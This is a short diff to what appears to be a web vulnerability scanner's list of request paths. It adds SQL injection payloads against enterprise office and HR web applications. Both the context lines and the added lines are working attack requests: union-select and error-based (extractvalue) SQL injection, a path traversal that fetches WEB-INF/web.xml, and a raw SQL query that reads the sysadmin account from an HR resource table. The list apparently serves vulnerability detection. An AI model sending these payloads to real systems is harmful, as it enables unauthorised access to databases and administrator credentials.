@@ -173,3 +173,5 @@
 /share/handle.php?_GET[module]=1%27+and+1=%7B%60=%27%60+1%7D+and+1=0+union+select+(select/**/md5({{num}}))--+%27
 /defaultroot/download_ftp.jsp?path=/../WEB-INF/&name=aaa&FileName=web.xml
 /yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5({{num}}))
+/Api/portal/elementEcodeAddon/getSqlData?sql=Select%20*%20from%20HrmResourceManager%20where%20loginid=%27sysadmin%27
+/comment/api/index.php?gid=1&page=2&rlist[]=@`%27`,%20extractvalue(1,%20concat_ws(0x20,%200x5c,(select%20md5(202072102)))),@`%27`
